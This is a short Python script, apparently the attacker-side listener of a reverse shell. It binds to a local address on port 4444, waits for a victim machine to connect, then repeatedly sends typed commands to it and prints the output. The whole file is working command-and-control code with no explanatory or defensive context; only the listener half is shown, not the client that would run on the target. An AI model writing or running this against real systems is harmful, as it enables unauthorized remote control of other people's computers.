import socket

SERVER_HOST = "192.168.0.176"
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

while True:
    command = input("Enter command: ")
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    result = client_socket.recv(BUFFER_SIZE).decode()
    print(result)

client_socket.close()
s.close()
